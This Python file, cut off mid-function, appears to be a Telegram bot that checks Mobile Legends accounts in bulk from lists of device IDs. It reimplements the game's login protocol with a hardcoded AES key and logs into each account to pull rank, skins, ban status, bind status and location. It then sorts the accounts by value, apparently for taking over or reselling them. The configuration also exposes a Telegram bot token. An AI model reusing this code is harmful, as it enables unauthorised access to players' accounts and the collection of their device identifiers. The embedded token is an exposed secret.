#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - TELEGRAM BOT v3.2
# Full-info + JSON output edition
# FIXED: robust zone extraction (list/dict/int/str)
# ===================================================================

import os, sys, time, uuid, json, threading, socket, zlib
import struct, re, logging, asyncio, zipfile, shutil, hashlib, random
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional
from pathlib import Path
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor
from functools import wraps

import zstandard as zstd
from Crypto.Cipher import AES

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import BadRequest, NetworkError
from telegram.request import HTTPXRequest

# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────

BOT_TOKEN   = "8702549007:AAHe3d-RSBaYs4wX4D4x4rkLpevipByEPqs"
OWNER_ID    = 8621676055
BOT_NAME    = "Premium DevID Seker"
BOT_VERSION = "3.2"

THREADS = 10

TELEGRAM_CONNECT_TIMEOUT = 60.0
TELEGRAM_READ_TIMEOUT    = 60.0
TELEGRAM_WRITE_TIMEOUT   = 60.0
TELEGRAM_POOL_TIMEOUT    = 60.0

TZ_WIB = timezone(timedelta(hours=7))

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR  = os.path.join(BASE_DIR, "PREMIUM_DEVID_SEKER_OUTPUT")
DATA_DIR    = os.path.join(BASE_DIR, "data")
RESULTS_DIR = os.path.join(BASE_DIR, "Results")

for d in (DATA_DIR, RESULTS_DIR, OUTPUT_DIR):
    os.makedirs(d, exist_ok=True)

USERS_FILE  = Path(DATA_DIR) / "users.json"
KEYS_FILE   = Path(DATA_DIR) / "keys.json"
CONFIG_FILE = Path(DATA_DIR) / "config.json"

# ────────────────────────────────────────────────────────────────
# MLBB PROTOCOL CONSTANTS
# ────────────────────────────────────────────────────────────────

AES_KEY        = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV         = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL        = 'and_usa'
LANGUAGE       = 'en'
SOCKET_TIMEOUT = 10.0

FOLDERS = {
    "detail":       "01_Hasil_Detail",
    "json":         "01_Hasil_Detail_JSON",
    "rank_warrior": "03_Rank_Warrior",
    "rank_elite":   "04_Rank_Elite",
    "rank_master":  "05_Rank_Master",
    "rank_gm":      "06_Rank_Grandmaster",
    "rank_epic":    "07_Rank_Epic",
    "rank_legend":  "08_Rank_Legend",
    "rank_mythic":  "09_Rank_Mythic",
    "v2l_active":   "10_V2L_Active",
    "v2l_inactive": "11_V2L_Inactive",
    "sultan":       "12_Sultan",
    "error":        "99_Error",
}

def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in FOLDERS.values():
        os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)
ensure_dirs()

# ────────────────────────────────────────────────────────────────
# LOGGING
# ────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
log = logging.getLogger("premiumbot")

# ────────────────────────────────────────────────────────────────
# HERO MAP / RANK MAP
# ────────────────────────────────────────────────────────────────

HERO_ID_MAP: Dict[int, str] = {
    1: 'Miya', 2: 'Balmond', 3: 'Saber', 4: 'Alice', 5: 'Nana',
    6: 'Tigreal', 7: 'Alucard', 8: 'Karina', 9: 'Akai', 10: 'Franco',
    11: 'Bane', 12: 'Bruno', 13: 'Clint', 14: 'Rafaela', 15: 'Eudora',
    16: 'Zilong', 17: 'Fanny', 18: 'Layla', 19: 'Minotaur', 20: 'Lolita',
    21: 'Hayabusa', 22: 'Freya', 23: 'Gord', 24: 'Natalia', 25: 'Kagura',
    26: 'Chou', 27: 'Sun', 28: 'Alpha', 29: 'Ruby', 30: 'Yi Sun-shin',
    31: 'Moskov', 32: 'Johnson', 33: 'Cyclops', 34: 'Estes', 35: 'Hilda',
    36: 'Aurora', 37: 'Lapu-Lapu', 38: 'Vexana', 39: 'Roger', 40: 'Karrie',
    41: 'Gatotkaca', 42: 'Harley', 43: 'Irithel', 44: 'Grock', 45: 'Argus',
    46: 'Odette', 47: 'Lancelot', 48: 'Diggie', 49: 'Hylos', 50: 'Zhask',
    51: 'Helcurt', 52: 'Pharsa', 53: 'Lesley', 54: 'Jawhead', 55: 'Angela',
    56: 'Gusion', 57: 'Valir', 58: 'Martis', 59: 'Uranus', 60: 'Hanabi',
    61: "Chang'e", 62: 'Kaja', 63: 'Selena', 64: 'Aldous', 65: 'Claude',
    66: 'Vale', 67: 'Leomord', 68: 'Lunox', 69: 'Hanzo', 70: 'Belerick',
    71: 'Kimmy', 72: 'Thamuz', 73: 'Harith', 74: 'Minsitthar', 75: 'Kadita',
    76: 'Faramis', 77: 'Badang', 78: 'Khufra', 79: 'Granger', 80: 'Guinevere',
    81: 'Esmeralda', 82: 'Terizla', 83: 'X.Borg', 84: 'Ling', 85: 'Dyrroth',
    86: 'Lylia', 87: 'Baxia', 88: 'Masha', 89: 'Wanwan', 90: 'Silvanna',
    91: 'Cecilion', 92: 'Carmilla', 93: 'Atlas', 94: 'Popol and Kupa',
    95: 'Yu Zhong', 96: 'Luo Yi', 97: 'Benedetta', 98: 'Khaleed',
    99: 'Barats', 100: 'Brody', 101: 'Yve', 102: 'Mathilda', 103: 'Paquito',
    104: 'Gloo', 105: 'Beatrix', 106: 'Phoveus', 107: 'Natan', 108: 'Aulus',
    109: 'Aamon', 110: 'Valentina', 111: 'Edith', 112: 'Floryn', 113: 'Yin',
    114: 'Melissa', 115: 'Xavier', 116: 'Julian', 117: 'Fredrinn', 118: 'Joy',
    119: 'Novaria', 120: 'Arlott', 121: 'Ixia', 122: 'Nolan', 123: 'Cici',
    124: 'Chip', 125: 'Zhuxin', 126: 'Suyou', 127: 'Lukas', 128: 'Kalea',
    129: 'Zetian', 130: 'Obsidia'
}

def hero_name(hid: int) -> str:
    return HERO_ID_MAP.get(hid, f'Unknown({hid})')

RANK_DEFS = [
    (0, 4, 'Warrior III'), (5, 9, 'Warrior II'), (10, 14, 'Warrior I'),
    (15, 19, 'Elite IV'), (20, 24, 'Elite III'), (25, 29, 'Elite II'),
    (30, 34, 'Elite I'), (35, 39, 'Master IV'), (40, 44, 'Master III'),
    (45, 49, 'Master II'), (50, 54, 'Master I'), (55, 59, 'Grandmaster IV'),
    (60, 64, 'Grandmaster III'), (65, 69, 'Grandmaster II'), (70, 74, 'Grandmaster I'),
    (75, 81, 'Epic IV'), (82, 88, 'Epic III'), (89, 95, 'Epic II'),
    (96, 107, 'Epic I'), (108, 114, 'Legend IV'), (115, 121, 'Legend III'),
    (122, 128, 'Legend II'), (129, 135, 'Legend I'),
    (136, 160, lambda p: f'Mythic {p - 135}'),
    (161, 195, lambda p: f'Mythical Honor {p - 135}'),
    (196, 235, lambda p: f'Mythical Glory {p - 157}'),
    (236, 999, lambda p: f'Mythical Immortal {p - 157}')
]

def map_rank(p) -> str:
    try:
        p = int(p)
    except:
        return "Unranked"
    if p <= 0:
        return "Unranked"
    for mn, mx, r in RANK_DEFS:
        if mn <= p <= mx:
            return r(p) if callable(r) else r
    return 'Unknown'

COLLECTOR_TIERS = [
    (0, 'None'), (1, 'Collector I'), (100, 'Collector II'),
    (300, 'Collector III'), (600, 'Collector IV'), (1000, 'Collector V'),
    (2000, 'Collector VI'), (5000, 'Collector VII')
]

def map_collector(pts: int) -> str:
    t = 'None'
    for th, lb in COLLECTOR_TIERS:
        if pts >= th:
            t = lb
    return t

_AFFINITY   = {0: 'None', 1: 'Bronze', 2: 'Silver', 3: 'Gold', 4: 'Platinum', 5: 'Diamond'}
_BAN_CODES  = {1: 'Banned(perm)', 2: 'Banned(temp)', 3: 'Banned', 4: 'Suspended', 5: 'Restricted'}

def get_rank_category(rank_text: str) -> str:
    rt = rank_text.lower()
    if "warrior"     in rt: return "warrior"
    if "elite"       in rt: return "elite"
    if "grandmaster" in rt: return "gm"
    if "master"      in rt and "grand" not in rt: return "master"
    if "epic"        in rt: return "epic"
    if "legend"      in rt: return "legend"
    if "mythic" in rt or "immortal" in rt or "glory" in rt or "honor" in rt: return "mythic"
    return "other"

def fmt_ts(ts) -> str:
    if not ts or not isinstance(ts, (int, float)) or ts <= 0:
        return "N/A"
    try:
        return datetime.fromtimestamp(int(ts), tz=timezone.utc)\
            .astimezone(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')
    except:
        return "N/A"

def _extract_zone(res) -> Optional[int]:
    """Robust zone extraction from login response tag 2."""
    if not res:
        return None
    z = res.get(2)
    if z is None:
        return None
    if isinstance(z, int):
        return z
    if isinstance(z, str) and z.isdigit():
        return int(z)
    if isinstance(z, (list, tuple)) and len(z) > 0:
        first = z[0]
        if isinstance(first, int):
            return first
        if isinstance(first, str) and first.isdigit():
            return int(first)
    if isinstance(z, dict):
        v = z.get(0)
        if isinstance(v, int):
            return v
        if isinstance(v, str) and v.isdigit():
            return int(v)
    try:
        v = z[0]
        if isinstance(v, int):
            return v
        if isinstance(v, str) and v.isdigit():
            return int(v)
    except Exception:
        pass
    return None

# ────────────────────────────────────────────────────────────────
# SDP PROTOCOL
# ────────────────────────────────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT  = 2
    DOUBLE = 3
    STRING = 4
    LIST   = 5
    DICT   = 6
    STRUCT_BEGIN = 7
    STRUCT_END   = 8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data   = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack()
        elif isinstance(data, bytearray):
            self.data = bytes(data)
            self._unpack()
        elif data is not None:
            self.update(data)
            self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()):
            self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n: int) -> bytes:
        res = bytearray()
        while n >= 0x80:
            res.append((n & 0x7F) | 0x80)
            n >>= 7
        res.append(n & 0x7F)
        return bytes(res)

    def _read_varint(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, dtype: SdpDataType):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)

    def _pack_item(self, tag: int, val: Any):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-val)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_varint(len(val))
                for k, v in sorted(val.items()):
                    self._pack_item(0, k)
                    self._pack_item(0, v)
        else:
            raise Exception("Unsupported type")

    def _unpack_item(self) -> Tuple[int, Any]:
        if self.offset >= len(self.data): return 0, None
        hdr   = self.data[self.offset]
        tag   = hdr & 0xF
        dtype = SdpDataType(hdr >> 4)
        self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT:  return tag, struct.unpack("<f", self._read_varint().to_bytes(4,'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._read_varint().to_bytes(8,'little'))[0]
        if dtype == SdpDataType.STRING:
            l   = self._read_varint()
            raw = self.data[self.offset:self.offset + l]
            self.offset += l
            try:    return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l   = self._read_varint()
            res = [self._unpack_item()[1] for _ in range(l)]
            return tag, res
        if dtype == SdpDataType.DICT:
            l   = self._read_varint()
            res = {}
            for _ in range(l):
                _, k = self._unpack_item()
                _, v = self._unpack_item()
                res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

# ────────────────────────────────────────────────────────────────
# CONNECTION
# ────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host     = host
        self.port     = port
        self.sequence = 1
        self.socket   = None
        self.queue    = b''

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except: pass
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(SOCKET_TIMEOUT)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1
            self.socket   = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.cleanup()

    def send_data(self, pid: int, sdp: SdpStruct):
        pkt   = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp  = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(8192)
                if not d:
                    return None, None
                self.queue += d

            flags = int.from_bytes(self.queue[:4], 'big')
            size  = flags & 0xFFFFFF
            ctype = flags >> 24

            while len(self.queue) < size:
                d = self.socket.recv(8192)
                if not d:
                    return None, None
                self.queue += d

            data       = self.queue[4:size]
            self.queue = self.queue[size:]

            if ctype == 1:
                data = zlib.decompress(data)
            elif ctype == 16:
                data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data   = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3:
                    data = zlib.decompress(data)
                elif ctype == 18:
                    data = zstd.decompress(data)

            frame = SdpStruct(data)
            pid   = frame.get(0)
            if pid is None:
                return None, None

            body = None
            for tag in (6, 5):
                v = frame.get(tag)
                if v is None:
                    continue
                if isinstance(v, SdpStruct):
                    body = v
                elif isinstance(v, dict):
                    body = SdpStruct(v)
                elif isinstance(v, bytes):
                    body = SdpStruct(v)
                elif isinstance(v, bytearray):
                    body = SdpStruct(bytes(v))
                elif isinstance(v, str):
                    body = SdpStruct(v.encode('latin-1', errors='ignore'))
                else:
                    continue
                if body is not None:
                    break

            return pid, body

        except socket.timeout:
            return -1, None
        except Exception as e:
            log.debug(f"recv_data error: {e}")
            return None, None


class GameLogin(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei    = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid    = raw[48:] if len(raw) > 48 else ""

    def run(self) -> Tuple[Optional[int], Optional[int], str]:
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()

            if pid != 2:
                return None, None, f"FAIL (PID: {pid})"
            if res is None:
                return None, None, "FAIL (no body in login response)"

            acc  = res.get(0)
            zone = _extract_zone(res)

            if not acc or not zone:
                return None, None, f"FAIL (acc={acc}, zone={zone})"

            return acc, zone, "NORMAL"
        except Exception as e:
            return None, None, f"ERROR ({e})"
        finally:
            self.cleanup()


class GameConnection(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id  = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei        = raw[:32] if len(raw) >= 32 else raw
        self.android     = raw[32:48] if len(raw) >= 48 else ""
        self.adid        = raw[48:] if len(raw) > 48 else ""
        self.account_id  = 0
        self.session_key = ''
        self.zone_id     = 0
        self.game_host   = ''
        self.game_port   = 0
        self.creation_ts = 0
        self.ban_status  = "NORMAL"
        self.ban_end_ts  = 0

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id  = res.get(0)
            self.session_key = res[1]
            self.zone_id     = _extract_zone(res)
            self.creation_ts = res.get(19, 0)
            err = res.get(10, 0)
            if err in (3, 4, 5, 6, 100, 101, 102):
                self.ban_status = "BANNED"
                self.ban_end_ts = res.get(20, 0)
            else:
                self.ban_status = "NORMAL"
            return True
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            host, port       = res[1].split(':')
            self.game_host   = host
            self.game_port   = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host, self.port = self.game_host, self.game_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
        }))
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(10):
            pid, _ = self.recv_data()
            if pid in (-1, None): return False
            if pid == 10002: return True
        return False

    def check_ban_status(self) -> str:
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                binfo  = res[0]
                reason = binfo.get('ban_reason', 'Unknown')
                d, h, m, s = binfo.get('endtime_day','0'), binfo.get('endtime_hour','0'), binfo.get('endtime_min','0'), binfo.get('endtime_sec','0')
                self.ban_status = f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
                return self.ban_status
            if pid in (-1, None, 20002): break
        return self.ban_status

    def lookup_player(self, search_value: int):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        for _ in range(8):
            pid, res = self.recv_data()
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None
        return None

    def get_role_info(self, role_id: int, zone_id: int):
        self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10129: return res
        return None

    def get_skin_role_info(self, role_id: int, zone_id: int):
        self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10144: return res
        return None


def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
    for pid_req, pid_resp_list in [
        (10208, [10208]),
        (10145, [10146, 10160]),
        (10143, [10144]),
    ]:
        try:
            conn.send_data(pid_req, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            for _ in range(3):
                pid, res = conn.recv_data()
                if pid in (-1, None): break
                if pid in pid_resp_list and res:
                    data = dict(res)
                    for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                        val = data.get(tag)
                        if val is None:
                            nested = data.get(tag, {})
                            if isinstance(nested, dict):
                                for subtag in [10, 11, 13, 14, 15, 0, 2, 3, 5]:
                                    val = nested.get(subtag)
                                    if val is not None: break
                        if val is not None:
                            if isinstance(val, (int, float)):
                                return "Enabled" if int(val) > 0 else "Disabled"
                            if isinstance(val, str):
                                if val.lower() in ("1","true","enabled","yes"): return "Enabled"
                                if val.lower() in ("0","false","disabled","no"):  return "Disabled"
        except: pass
    return "N/A"

# ────────────────────────────────────────────────────────────────
# FULL PLAYER DATA PARSER
# ────────────────────────────────────────────────────────────────

def extract_player_data(result) -> Optional[Dict[str, Any]]:
    if not result or not result.get(0) or len(result[0]) == 0:
        return None
    try:
        pd = result[0][0]
        nickname  = pd.get(2, 'Unknown')
        player_id = pd.get(0, 'Unknown')
        server    = pd.get(1, 'Unknown')
        level     = pd.get(3, 'Unknown')

        bc  = pd.get(39, pd.get(40, 0))
        bet = pd.get(41, 0)
        if isinstance(bc, int) and bc in _BAN_CODES:
            ban_status = _BAN_CODES[bc]
        elif isinstance(bc, int) and bc > 0:
            ban_status = f'Banned(code {bc})'
        else:
            ban_status = 'Not Banned'
        ban_end = fmt_ts(bet) if bet else 'N/A'

        skin_count = pd.get(83, 0)
        try: skin_count = int(skin_count)
        except: skin_count = 0
        hero_count = pd.get(4, 0)
        win  = pd.get(18, 0)
        loss = pd.get(155, 0)
        total = win + loss
        wr = f'{win / total * 100:.2f}%' if total > 0 else 'N/A'

        last_login = fmt_ts(pd.get(5, 0))
        llc        = pd.get(87, 'Unknown')
        cac        = pd.get(97, 'Unknown')

        loc = 'N/A'
        ld = pd.get(71)
        if ld and isinstance(ld, list) and len(ld) >= 2:
            loc = ', '.join(str(x) for x in ld)

        sn = str(pd.get(30, '')).replace('`', '').strip()
        si = str(pd.get(31, ''))
        squad = f'{si} {sn}'.strip() if sn else '—'
        sqid = pd.get(34, pd.get(28, 0))
        squad_id = f'{sqid}' if sqid else 'N/A'

        hr = map_rank(pd.get(95)) if pd.get(95) is not None else 'Unknown'
        cr = map_rank(pd.get(8))  if pd.get(8)  is not None else 'Unknown'

        t136 = pd.get(136, {})
        cpt  = t136.get(9, 0) if isinstance(t136, dict) else 0
        ctier = map_collector(cpt)

        aff_lv = (pd.get(135, {}) or {}).get(1, 0)
        affinity = _AFFINITY.get(aff_lv, f'Lv{aff_lv}') if aff_lv else 'None'

        t91 = pd.get(91, [])
        lmh = hero_name(t91[0]) if isinstance(t91, list) and t91 else None
        prev: List[str] = []
        if isinstance(t91, list) and len(t91) > 1:
            seen = set()
            for hid in t91[1:]:
                if hid not in seen:
                    seen.add(hid)
                    prev.append(hero_name(hid))
                if len(prev) >= 5: break
        lm = {'hero_name': lmh, 'prev': prev} if lmh else None

        return {
            'nickname': nickname,
            'player_id': player_id,
            'server': server,
            'level': level,
            'ban_status': ban_status,
            'ban_end': ban_end,
            'skin_count': skin_count,
            'last_login': last_login,
            'last_login_country': llc,
            'create_country': cac,
            'hero_count': hero_count,
            'location': loc,
            'high_rank': hr,
            'current_rank': cr,
            'collector_tier': ctier,
            'squad': squad,
            'squad_id': squad_id,
            'affinity': affinity,
            'total_battles': total,
            'win_rate': wr,
            'last_match': lm,
        }
    except Exception as e:
        log.debug(f"Parse error: {e}")
        return None

# ────────────────────────────────────────────────────────────────
# DETAIL CHECK
# ────────────────────────────────────────────────────────────────

def process_detail(device_id: str, account_id: int, zone_id: int, out_dir: str = None) -> Tuple[bool, Optional[dict]]:
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                return False, None
            if not conn.get_game_server() or not conn.connect_to_game_server():
                return False, None

            skin_info = conn.get_skin_role_info(account_id, zone_id)
            ban_stat  = conn.check_ban_status()
            v2l       = get_v2l_status(conn, account_id, zone_id)
            result    = conn.lookup_player(account_id)

            pd = extract_player_data(result) if result else None
            if not pd:
                return False, None

            if ban_stat and ban_stat != "NORMAL" and pd.get('ban_status') in ("Not Banned", None, "NORMAL"):
                pd['ban_status'] = ban_stat

            pd['v2l_status']  = v2l
            pd['device_id']   = device_id
            pd['account_id']  = account_id
            pd['zone_id']     = zone_id
            pd['gs_info']     = f"{conn.game_host}:{conn.game_port}"

            try: pd['level'] = int(pd.get('level', 0))
            except: pd['level'] = 0
            try: pd['skin_count'] = int(pd.get('skin_count', 0))
            except: pd['skin_count'] = 0

            save_account(
                {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                pd, out_dir
            )
            return True, pd
    except Exception as e:
        log.error(f"process_detail error: {e}")
        return False, None

# ────────────────────────────────────────────────────────────────
# SAVE ENGINE
# ────────────────────────────────────────────────────────────────

save_lock = threading.Lock()

HIT_COUNTERS = {
    'sultan': 0, 'v2l_active': 0, 'v2l_inactive': 0, 'banned': 0,
    'warrior': 0, 'elite': 0, 'master': 0, 'gm': 0, 'epic': 0, 'legend': 0, 'mythic': 0
}
COUNTER_LOCK = threading.Lock()

def is_already_saved(device_id: str, filepath: str) -> bool:
    if not os.path.exists(filepath): return False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return device_id in f.read()
    except: return False


def build_account_dict(device_id: str, account_id: int, zone_id: int,
                       p: dict, gs_info: str = "N/A") -> dict:
    """Build the JSON-serializable account record."""
    raw = device_id.strip()
    if raw.startswith(("and_", "ios_")): raw = raw[4:]
    imei    = raw[:32] if len(raw) >= 32 else raw
    android = raw[32:48] if len(raw) >= 48 else "N/A"
    adid    = raw[48:] if len(raw) > 48 else "N/A"

    v2l_raw = p.get('v2l_status', 'N/A')
    v2l_txt = ("ACTIVE"   if str(v2l_raw).lower() in ('enabled','yes','1','true') else
               "INACTIVE" if str(v2l_raw).lower() in ('disabled','no','0','false') else
               "N/A")

    return {
        "device": {
            "id": device_id,
            "imei": imei,
            "android_id": android,
            "advertising_id": adid,
        },
        "account": {
            "role_id": account_id,
            "zone_id": zone_id,
            "nickname": p.get('nickname', 'N/A'),
            "level": p.get('level', 0),
            "last_login_country": p.get('last_login_country', 'N/A'),
            "create_country": p.get('create_country', 'N/A'),
            "location": p.get('location', 'N/A'),
            "last_login": p.get('last_login', 'N/A'),
        },
        "status": {
            "ban_status": p.get('ban_status', 'Not Banned'),
            "ban_end": p.get('ban_end', 'N/A'),
            "v2l_status": v2l_txt,
        },
        "rank": {
            "current": p.get('current_rank', 'Unranked'),
            "highest": p.get('high_rank', 'Unranked'),
        },
        "collection": {
            "heroes": p.get('hero_count', 0),
            "skins": p.get('skin_count', 0),
            "collector_tier": p.get('collector_tier', 'None'),
            "affinity": p.get('affinity', 'None'),
        },
        "battle": {
            "matches": p.get('total_battles', 0),
            "win_rate": p.get('win_rate', 'N/A'),
            "last_match": p.get('last_match'),
        },
        "squad": {
            "name": p.get('squad', '—'),
            "id": p.get('squad_id', 'N/A'),
        },
        "server": {
            "game": gs_info,
        },
        "meta": {
            "checked_at": datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB'),
            "bot": f"{BOT_NAME} v{BOT_VERSION}",
        }
    }


def format_json_card(device_id: str, account_id: int, zone_id: int,
                     p: dict, gs_info: str = "N/A") -> str:
    """Return pretty JSON string."""
    return json.dumps(
        build_account_dict(device_id, account_id, zone_id, p, gs_info),
        indent=2, ensure_ascii=False
    )


def save_account(account_info: dict, pd: dict, out_dir: str = None):
    base = out_dir if out_dir else OUTPUT_DIR
    device = account_info.get('Device id', '')
    acc    = account_info.get('role_id', '?')
    zone   = account_info.get('zone_id', '?')
    ban_stat = pd.get('ban_status', 'Not Banned')
    is_banned = any(x in str(ban_stat) for x in ('Ban', 'Suspend', 'Restrict'))

    if is_banned:
        banned_file = os.path.join(base, FOLDERS["error"], "banned_accounts.txt")
        os.makedirs(os.path.dirname(banned_file), exist_ok=True)
        with save_lock:
            with open(banned_file, "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK: HIT_COUNTERS['banned'] += 1
        return

    nick = pd.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", ""): return

    skin     = pd.get('skin_count', 0)
    v2l      = pd.get('v2l_status', 'N/A')
    v2l_text = ("ACTIVE"   if str(v2l).lower() in ('enabled','yes','1','true') else
                "INACTIVE" if str(v2l).lower() in ('disabled','no','0','false') else "N/A")
    cur_rank      = pd.get('current_rank', 'Unranked')
